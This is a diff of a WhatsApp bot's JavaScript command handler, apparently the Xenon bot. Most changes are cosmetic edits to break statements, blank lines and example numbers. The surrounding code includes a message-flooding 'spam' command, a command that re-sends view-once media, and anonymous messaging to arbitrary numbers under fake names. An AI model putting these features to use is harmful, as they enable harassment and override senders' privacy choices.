                replygcxenon(`*Anti Foreign Country Code of ${botname} is*\n\n${setv} Country Code : ${antiforeignnumber}\n\n_Note: Once antiforeign number is activated in any group chat, only members related to this country code are allowed to stay in the group chat, others will be kicked immediately, if chatted._`)
                }
-                break
+                break;
 //===========================================================================================================================//
-
 			case 'setexif':
             case 'setwm':{
                 if (!XenonTheCreator) return XenonStickOwner()
@@ -14528,9 +14185,8 @@ case 'listowner': {
                 global.author = text.split("|")[1]
                 replygcxenon(`Exif successfully changed to\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
                 }
-                break
+                break;
 //===========================================================================================================================//
-
 			    case 'creategc': case 'creategroup': {
 if (!XenonTheCreator) return XenonStickOwner()
 if (!args.join(" ")) return replygcxenon(`Use ${prefix+command} groupname`)
@@ -14549,9 +14205,8 @@ XenonBotInc.sendMessage(m.chat, { text:teksop, mentions: await XenonBotInc.parse
 	replygcxenon(`Error`)
 	}
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'resetuser':
             case 'resetdbuser': {
                if (!XenonTheCreator) return XenonStickOwner()
@@ -14559,18 +14214,16 @@ break
                replygcxenon(`Succesfully Deleted ${totalusernya} Users in Database`)
                db.users = []
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'resethit':
             case 'resettotalhit': {
                if (!XenonTheCreator) return XenonStickOwner()
                global.db.settings[botNumber].totalhit = 0
                replygcxenon(mess.done)
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'setreply':{
                if (!XenonTheCreator) return XenonStickOwner()
                if (text.startsWith('v')) {
@@ -14648,9 +14301,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
             }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'statustext': 
             case 'upswtext':
             case 'upswteks': {
@@ -14659,9 +14311,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                await XenonBotInc.sendMessage('status@broadcast', { text: q }, { backgroundColor: '#FF000000', font: 3, statusJidList: Object.keys(global.db.users) })
                replygcxenon(mess.done)
             }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'statusvideo':
             case 'upswvideo': {
                if (!XenonTheCreator) return XenonStickOwner()
@@ -14678,9 +14329,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   replygcxenon('Reply to video')
                }
             }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'statusimg':
             case 'statusimage':
             case 'upswimg': {
@@ -14698,9 +14348,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   replygcxenon('Reply to image')
                }
             }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'statusaudio':
             case 'upswaudio': {
                if (!XenonTheCreator) return XenonStickOwner()
@@ -14721,9 +14370,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                   replygcxenon('Reply to audio')
                }
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'setvidmenu':
             case 'svm': 
             	case 'setvgifmenu':
@@ -14738,9 +14386,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                 	replygcxenon(`Please reply to a image with caption ${prefix+command}`)
                 }
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'setimgmenu':
             case 'sim': {
                 if (!XenonTheCreator) return XenonStickOwner()
@@ -14753,9 +14400,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                 	replygcxenon(`Please reply to a image with caption ${prefix+command}`)
                 }
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'setmenu': {
             if (!XenonTheCreator) return XenonStickOwner()
             if (text.startsWith('v')) {
@@ -14865,9 +14511,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
 }
-break
+break;
 //===========================================================================================================================//
-
 			case 'bc':
             case 'broadcast': {
                if (!XenonTheCreator) return XenonStickOwner()
@@ -14895,9 +14540,8 @@ break
                }
                replygcxenon(`Success ${command} To ${Object.keys(global.db.users).length} Users`)
             }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'bcgc':
             case 'bcgroup': {
                 if (!XenonTheCreator) return XenonStickOwner()
@@ -14916,7 +14560,7 @@ break
                                 showAdAttribution: true,
                                 title: botname,
                                 body: `Sent in ${i.length} Group`,
-                                thumbnailUrl: 'https://imgur.com/a/Kx2xDAw',
+                                thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
                                 sourceUrl: wagc,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -14926,9 +14570,8 @@ break
                 }
                 replygcxenon(`Successful in sending Broadcast To ${anu.length} Group`)
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'spam':
 				if (!XenonTheCreator) return XenonStickOwner()
 					if (!text) return replygcxenon(`Use ${prefix +command} text|amount`)
@@ -14939,9 +14582,8 @@ break
 				for (let i = 0; i < xenonarg[1]; i++){
 					XenonBotInc.sendMessage(m.chat, {text: xenonarg[0]})
 				}
-				break
+				break;
 //===========================================================================================================================//
-
 			case 'antiforeign':{
             	if (!m.isGroup) return XenonStickGroup()
 if (!m.isBotAdmin) return XenonStickBotAdmin()
@@ -15015,15 +14657,14 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
                }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'poll': {
 	if (!XenonTheCreator) return XenonStickOwner()
             let [poll, opt] = text.split("|")
             if (text.split("|") < 2)
                 return await replygcxenon(
-                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?| Xenon...`
+                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xenon..`
                 )
             try {
             let options = []
@@ -15038,13 +14679,12 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
             })
             } catch {
             	replygcxenon(
-                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?| Xenon...`
+                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xenon....`
                 )
                 }
         }
-        break
+        break;
 //===========================================================================================================================//
-
 			case 'autoblock':
                 if (!XenonTheCreator) return XenonStickOwner()
                 if (q == 'on') {
@@ -15115,9 +14755,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
   messageId: msg.key.id
 })
 }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'onlygroup':
             case 'onlygc':
                 if (!XenonTheCreator) return XenonStickOwner()
@@ -15189,9 +14828,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
   messageId: msg.key.id
 })
 }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'onlyprivatechat':
             case 'onlypc':
                 if (!XenonTheCreator) return XenonStickOwner()
@@ -15263,9 +14901,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
   messageId: msg.key.id
 })
 }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'onlyindia':
             case 'onlyindianumber':
                 if (!XenonTheCreator) return XenonStickOwner()
@@ -15337,9 +14974,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
   messageId: msg.key.id
 })
 }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'onlyindo':
             case 'onlyindonumber':
                 if (!XenonTheCreator) return XenonStickOwner()
@@ -15411,25 +15047,22 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
   messageId: msg.key.id
 })
 }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'setautoblock':
                 if (!XenonTheCreator) return XenonStickOwner()
                 if (!text) return replygcxenon(`Example : ${prefix + command} 92`)
                 global.autoblocknumber = text
                 replygcxenon(`Auto-Block number successfully changed to ${text}`)
-                break
+                break;
 //===========================================================================================================================//
-
                 case 'setantiforeign':
                 if (!XenonTheCreator) return XenonStickOwner()
-                if (!text) return replygcxenon(`Example : ${prefix + command} 225`)
+                if (!text) return replygcxenon(`Example : ${prefix + command} 91`)
                 global.antiforeignnumber = text
                 replygcxenon(`Anti-foreign number successfully changed to ${text}`)
-                break
+                break;
 //===========================================================================================================================//
-
 			case 'autoswview':
     case 'autostatusview':{
              if (!XenonTheCreator) return XenonStickOwner()
@@ -15503,9 +15136,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
             }
-            break
+            break;
 //===========================================================================================================================//
-
     case 'anticall': {
              if (!XenonTheCreator) return XenonStickOwner()
                
@@ -15578,9 +15210,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 })
 }
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'autorecordtype':
                 if (!XenonTheCreator) return XenonStickOwner()
                 
@@ -15652,9 +15283,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
   messageId: msg.key.id
 })
 }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'autorecord':
                 if (!XenonTheCreator) return XenonStickOwner()
                 
@@ -15726,9 +15356,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
   messageId: msg.key.id
 })
 }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'autotype':
                 if (!XenonTheCreator) return XenonStickOwner()
                 
@@ -15800,9 +15429,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
   messageId: msg.key.id
 })
 }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'autoread':
                 if (!XenonTheCreator) return XenonStickOwner()
                 if (q === 'on') {
@@ -15873,9 +15501,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
   messageId: msg.key.id
 })
 }
-            break
+            break;
 //===========================================================================================================================//
-
             case 'autobio':
                 if (!XenonTheCreator) return XenonStickOwner()
                 
@@ -15947,9 +15574,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
   messageId: msg.key.id
 })
 }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'self': case 'public': case 'mode': {
                 if (!XenonTheCreator) return XenonStickOwner()
                 if (q == 'on') {
@@ -15975,18 +15601,16 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                 	await XenonBotInc.sendButtonMsg(m.chat, 'BOT MODE', xenonytimewisher, 'Please choose 🌹', null, button, m);
                 	}
                 }
-                break
+                break;
 //===========================================================================================================================//
-
 			case 'setbio': case 'setbotbio': {
 				if (!XenonTheCreator) return XenonStickOwner()
 				if (!text) return replygcxenon(`Where's the text??`)
 				XenonBotInc.setStatus(q)
 				replygcxenon(`*Bio has been changed to ${q}*`)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'setbotpp':
             case 'setpp':
             case 'setpp':
@@ -16024,9 +15648,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                     fs.unlinkSync(medis)
                     replygcxenon(mess.done)
                 }
-                break
+                break;
 //===========================================================================================================================//
-
 			case 'join': {
 				if (!XenonTheCreator) return XenonStickOwner()
 				if (!text) return replygcxenon('Enter Group Link!')
@@ -16041,40 +15664,36 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 					if (res.data == 500) return replygcxenon('Full Group❗');
 				})
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'leave': case 'leavegc': {
 				if (!XenonTheCreator) return XenonStickOwner()
 				await XenonBotInc.groupLeave(m.chat).then((res) => replygcxenon(jsonformat(res))).catch((err) => replygcxenon(jsonformat(err)))
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'blokir': case 'block': {
 				if (!XenonTheCreator) return XenonStickOwner()
 				if (!text && !m.quoted) {
-					replygcxenon(`Example: ${prefix + command} 225xxx`)
+					replygcxenon(`Example: ${prefix + command} 225xx`)
 				} else {
 					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
 					await XenonBotInc.updateBlockStatus(numbersOnly, 'block').then((a) => replygcxenon(mess.done)).catch((err) => replygcxenon('Fail!'))
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'openblokir': case 'unblokir': case 'openblock': case 'unblock': {
 				if (!XenonTheCreator) return XenonStickOwner()
 				if (!text && !m.quoted) {
-					replygcxenon(`Example: ${prefix + command} 225xxx`)
+					replygcxenon(`Example: ${prefix + command} 225xx`)
 				} else {
 					const numbersOnly = m.isGroup ? (text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender) : m.chat
 					await XenonBotInc.updateBlockStatus(numbersOnly, 'unblock').then((a) => replygcxenon(mess.done)).catch((err) => replygcxenon('Fail!'))
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'listpc': {
 				if (!XenonTheCreator) return XenonStickOwner()
 				let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
@@ -16085,9 +15704,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 				}
 				XenonBotInc.sendTextMentions(m.chat, teks, m)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'listgc': {
 				if (!XenonTheCreator) return XenonStickOwner()
 				let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
@@ -16098,9 +15716,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 				}
 				XenonBotInc.sendTextMentions(m.chat, teks, m)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'creategc': {
 				if (!XenonTheCreator) return XenonStickOwner()
 				if (!text) return replygcxenon(`Example:\n${prefix + command} *Gc Name*`)
@@ -16110,9 +15727,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 				await XenonBotInc.groupParticipantsUpdate(group.id, [m.sender], 'promote')
 				await XenonBotInc.sendMessage(group.id, { text: 'Done' })
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'addpr': case 'addprem': case 'addpremium': {
 				if (!XenonTheCreator) return XenonStickOwner()
 				if (!text) return replygcxenon(`Example:\n${prefix + command} @tag|time(s/m/h/d)`)
@@ -16129,9 +15745,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 					replygcxenon(`Enter the time!\nExample: ${prefix + command} @tag|time`)
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'delpr': case 'delprem': case 'delpremium': {
 				if (!XenonTheCreator) return XenonStickOwner()
 				if (!text) return replygcxenon(`Example:\n${prefix + command} @tag`)
@@ -16146,9 +15761,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 					replygcxenon(`User @${nmrnya.split('@')[0]} Not Premium❗`)
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'listpr': case 'listprem': case 'listpremium': {
 				if (!XenonTheCreator) return XenonStickOwner()
 				let txt = `*------「 LIST PREMIUM 」------*\n\n`
@@ -16157,9 +15771,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 				}
 				replygcxenon(txt)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			
 			// Group Menu
 			case 'add': {
@@ -16167,7 +15780,7 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 				if (!m.isAdmin) return XenonStickAdmin()
 				if (!m.isBotAdmin) return XenonStickBotAdmin()
 				if (!text && !m.quoted) {
-					replygcxenon(`EXAMPLE: ${prefix + command} 225xxx`)
+					replygcxenon(`EXAMPLE: ${prefix + command} 225xx`)
 				} else {
 					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
 					try {
@@ -16191,53 +15804,49 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 					}
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'kick': {
 				if (!m.isGroup) return XenonStickGroup()
 				if (!m.isAdmin) return XenonStickAdmin()
 				if (!m.isBotAdmin) return XenonStickBotAdmin()
 				if (!text && !m.quoted) {
-					replygcxenon(`Example: ${prefix + command} 225xxx`)
+					replygcxenon(`Example: ${prefix + command} 225xx`)
 				} else {
 					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
 					await XenonBotInc.groupParticipantsUpdate(m.chat, [numbersOnly], 'remove').catch((err) => replygcxenon('Failed to Kick User!'))
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'promote': {
 				if (!m.isGroup) return XenonStickGroup()
 				if (!m.isAdmin) return XenonStickAdmin()
 				if (!m.isBotAdmin) return XenonStickBotAdmin()
 				if (!text && !m.quoted) {
-					replygcxenon(`Example: ${prefix + command} 225xxx`)
+					replygcxenon(`Example: ${prefix + command} 225xx`)
 				} else {
 					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
 					await XenonBotInc.groupParticipantsUpdate(m.chat, [numbersOnly], 'promote').catch((err) => replygcxenon('Fail!'))
 					replygcxenon(mess.done)
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'demote': {
 				if (!m.isGroup) return XenonStickGroup()
 				if (!m.isAdmin) return XenonStickAdmin()
 				if (!m.isBotAdmin) return XenonStickBotAdmin()
 				if (!text && !m.quoted) {
-					replygcxenon(`Example: ${prefix + command} 225xxx`)
+					replygcxenon(`Example: ${prefix + command} 225xx`)
 				} else {
 					const numbersOnly = text ? text.replace(/\D/g, '') + '@s.whatsapp.net' : m.quoted?.sender
 					await XenonBotInc.groupParticipantsUpdate(m.chat, [numbersOnly], 'demote').catch((err) => replygcxenon('Failed!'))
 					replygcxenon(mess.done)
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'setnamegc': case 'setsubject': case 'setname': case 'setnamegc': case 'setsubject': case 'setsubjectgc': {
 				if (!m.isGroup) return XenonStickGroup()
 				if (!m.isAdmin) return XenonStickAdmin()
@@ -16249,9 +15858,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 					await XenonBotInc.groupUpdateSubject(m.chat, teksnya).catch((err) => replygcxenon('Fail!'))
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'setdesc': case 'setdescgc': case 'setdesk': case 'setdeskgc': {
 				if (!m.isGroup) return XenonStickGroup()
 				if (!m.isAdmin) return XenonStickAdmin()
@@ -16263,9 +15871,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 					await XenonBotInc.groupUpdateDescription(m.chat, teksnya).catch((err) => replygcxenon('Fail!'))
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'setppgroup':
             case 'setppgrup':
             case 'setppgc':
@@ -16307,16 +15914,14 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
                     fs.unlinkSync(medis)
                     replygcxenon(mess.done)
                 }
-                break
+                break;
 //===========================================================================================================================//
-
 			case 'delete': case 'del': case 'd': {
 				if (!m.quoted) return replygcxenon('Reply to the message you want to delete')
 				await XenonBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: m.isBotAdmin ? false : true, id: m.quoted.id, participant: m.quoted.sender }})
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'linkgroup': case 'linkgrup': case 'linkgc': case 'urlgroup': case 'urlgrup': case 'urlgc': {
 				if (!m.isGroup) return XenonStickGroup()
 				if (!m.isAdmin) return XenonStickAdmin()
@@ -16324,9 +15929,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 				let response = await XenonBotInc.groupInviteCode(m.chat)
 				await XenonBotInc.sendMessage(m.chat, { text: `https://chat.whatsapp.com/${response}\n\nLink Group : ${(await XenonBotInc.groupMetadata(m.chat)).subject}`, detectLink: true }, { quoted: m });
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'resetlink': case 'revoke': case 'newlink': case 'newurl': {
 				if (!m.isGroup) return XenonStickGroup()
 				if (!m.isAdmin) return XenonStickAdmin()
@@ -16335,9 +15939,8 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 					replygcxenon(`Reset Success, Group Invite Link ${m.metadata.subject}`)
 				}).catch((err) => replygcxenon('Fail!'))
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'group': case 'grup': {
 				if (!m.isGroup) return XenonStickGroup()
 				if (!m.isAdmin) return XenonStickAdmin()
@@ -16363,26 +15966,23 @@ await XenonBotInc.relayMessage(msg.key.remoteJid, msg.message, {
 					await XenonBotInc.sendButtonMsg(m.chat, 'Group Mode', xenonytimewisher, 'Please choose', null, button, m);
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
 if (!m.isGroup) return XenonStickGroup()
 if (!m.isAdmin && !XenonTheCreator) return XenonStickAdmin()
 if (!m.isBotAdmin) return XenonStickBotAdmin()
     await XenonBotInc.removeProfilePicture(m.chat)
     }
-    break
+    break;
 //===========================================================================================================================//
-
     case 'deleteppbot': case 'delbotpp': case 'delppbot': {
 if (!XenonTheCreator) return XenonStickOwner()
     await XenonBotInc.removeProfilePicture(XenonBotInc.user.id)
     replygcxenon(`Success in deleting bot's profile picture`)
     }
-    break
+    break;
 //===========================================================================================================================//
-
 			case 'antidelete': {
 				if (!m.isGroup) return XenonStickGroup()
 				if (!m.isAdmin) return XenonStickAdmin()
@@ -16411,9 +16011,8 @@ if (!XenonTheCreator) return XenonStickOwner()
 					await XenonBotInc.sendButtonMsg(m.chat, 'Group Mode', xenonytimewisher, 'Please choose', null, buttonnya, m);
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'tagall': {
 				if (!m.isGroup) return XenonStickGroup()
 				if (!m.isAdmin) return XenonStickAdmin()
@@ -16424,18 +16023,16 @@ if (!XenonTheCreator) return XenonStickOwner()
 				}
 				await XenonBotInc.sendMessage(m.chat, { text: teks, mentions: m.metadata.participants.map(a => a.id) }, { quoted: m })
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'hidetag': case 'h': {
 				if (!m.isGroup) return XenonStickGroup()
 				if (!m.isAdmin) return XenonStickAdmin()
 				if (!m.isBotAdmin) return XenonStickBotAdmin()
 				XenonBotInc.sendMessage(m.chat, { text : q ? q : '' , mentions: m.metadata.participants.map(a => a.id)}, { quoted: m })
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'totag': {
 				if (!m.isGroup) return XenonStickGroup()
 				if (!m.isAdmin) return XenonStickAdmin()
@@ -16444,18 +16041,16 @@ if (!XenonTheCreator) return XenonStickOwner()
 				delete m.quoted.chat
 				await XenonBotInc.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: m.metadata.participants.map(a => a.id) })
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'listonline': case 'liston': {
 				if (!m.isGroup) return XenonStickGroup()
 				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
 				let online = [...Object.keys(store.presences[id]), botNumber]
 				await XenonBotInc.sendMessage(m.chat, { text: 'List Online:\n\n' + online.map(v => `${setv} @` + v.replace(/@.+/, '')).join`\n`, mentions: online }, { quoted: m }).catch((e) => replygcxenon('Fail'))
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			
 			// Bot Menu
 			case 'owner': {
@@ -16485,62 +16080,53 @@ list.push({
                     quoted: m
                 })
             }
-            break
+            break;
 //===========================================================================================================================//
-
 			case 'profile': case 'cekme': case 'cek': {
 				const user = Object.keys(global.db.users)
 				const infoUser = global.db.users[m.sender]
 				const teks = `*Profile @${m.sender.split('@')[0]}* :\nUser Bot : ${user.includes(m.sender) ? 'True' : 'False'}\nUser : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}\nLimit : ${infoUser.limit}\nMoney : ${infoUser ? infoUser.uang.toLocaleString('id-ID') : '0'}`
 				await XenonBotInc.sendTextMentions(m.chat, teks, m)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'req': case 'request': {
 				if (!text) return replygcxenon('What do you want to request from the owner??')
 				await XenonBotInc.sendMessage(m.chat, { text: `*Request Has Been Sent To Owner*\n_Thank You🙏_` }, { quoted: m })
 				await XenonBotInc.sendFromOwner(ownernumber, `Order From : @${m.sender.split('@')[0]}\nFor Owners\n\nRequest ${text}`, m, { contextInfo: { mentionedJid: [m.sender], isForwarded: true }})
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'daily': case 'claim': {
 				daily(XenonBotInc, m, global.db.users)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'transferlimit': case 'tflimit': case 'tlimit': {
 				transferLimit(XenonBotInc, m, args, global.db.users)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'transfermoney': case 'tmoney': case 'transfer': {
 				transferUang(XenonBotInc, m, args, global.db.users)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'buy': {
 				buy(m, args, db)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'react': {
 				XenonBotInc.sendMessage(m.chat, { react: { text: args[0], key: m.quoted ? m.quoted.key : m.key }})
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'tagme': {
 				XenonBotInc.sendMessage(m.chat, { text: `@${m.sender.split('@')[0]}`, mentions: [m.sender] }, { quoted: m })
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			
 			case 'p': case 'ping': case 'botstatus': case 'statusbot': {
 				const used = process.memoryUsage()
@@ -16575,9 +16161,8 @@ list.push({
 				respon = `Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}\n\n💻 Info Server\nRAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}\n\n_NodeJS Memory Usaage_\n${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}\n\n${cpus[0] ? `_Total CPU Usage_\n${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}\n_CPU Core(s) Usage (${cpus.length} Core CPU)_\n${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}`.trim()
 				replygcxenon(respon)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'speedtest': case 'speed': {
 				replygcxenon('Testing Speed...')
 				let cp = require('child_process')
@@ -16594,18 +16179,16 @@ list.push({
 					if (stderr.trim()) replygcxenon(stderr)
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'afk': {
 				let user = global.db.users[m.sender]
 				user.afkTime = + new Date
 				user.afkReason = text
 				replygcxenon(`@${m.sender.split('@')[0]} Been Afk ${text ? ': ' + text : ''}`)
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'readviewonce': case 'readviewone': case 'rvo': {
 				if (!m.quoted) return replygcxenon(`Reply view once message\nExample: ${prefix + command}`)
 				if (m.quoted.msg.viewOnce) {
@@ -16619,9 +16202,8 @@ list.push({
 					replygcxenon(`Reply view once message\nExample: ${prefix + command}`)
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'inspect': {
 				if (!text) return replygcxenon('Enter Group Link!')
 				let code = q.match(/chat.whatsapp.com\/([\w\d]*)/g);
@@ -16637,9 +16219,8 @@ list.push({
 					if (res.data == 410) return replygcxenon('Group URL Has Been Reset❗');
 				});
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'q': case 'quoted': {
 				if (!m.quoted) return replygcxenon('Reply the message!')
 				const anu = await m.getQuotedObj()
@@ -16647,13 +16228,12 @@ list.push({
 				if (!anu.quoted) return replygcxenon('The Message You Reply Does Not Contain a Reply')
 				await XenonBotInc.relayMessage(m.chat, { [anu.quoted.type]: anu.quoted.msg }, {})
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'confes': case 'confess': case 'menfes': case 'menfess': {
 				if (m.isGroup) return XenonStickPrivate();
 				if (game.menfes[m.sender]) return replygcxenon(`You're In Session ${command}!`)
-				if (!text) return replygcxenon(`Example : ${prefix + command} 225xxxx|Fake name`)
+				if (!text) return replygcxenon(`Example : ${prefix + command} 225xxx|Fake name`)
 				let [teks1, teks2] = text.split`|`
 				if (!isNaN(teks1) && !teks1.startsWith('0') && teks1) {
 					const tujuan = teks1.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
@@ -16678,12 +16258,11 @@ list.push({
 					XenonBotInc.sendMessage(tujuan, { text: `_${command} connected_\n*Note :* if you want to end, type _*${prefix}del${command}*_` });
 					replygcxenon(`_Start ${command}..._\n*Please start sending messages/media*\n*Duration ${command} only for 10 minutes*\n*Note :* if you want to end, type _*${prefix}del${command}*_`)
 				} else {
-					replygcxenon(`Enter the number!\nExample : ${prefix + command} 225xxxx|Fake name`)
+					replygcxenon(`Enter the number!\nExample : ${prefix + command} 225xxx|Fake name`)
 				}
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			case 'delconfes': case 'delconfess': case 'delmenfes': case 'delmenfess': {
 				if (!game.menfes[m.sender]) return replygcxenon(`You Are Not In ${command.split('del')[1]} session!`)
 				let anu = game.menfes[m.sender]
@@ -16692,9 +16271,8 @@ list.push({
 				delete game.menfes[anu.tujuan];
 				delete game.menfes[m.sender];
 			}
-			break
+			break;
 //===========================================================================================================================//
-
 			
 			// Tools Menu
 			case 'fetch': case 'get': {
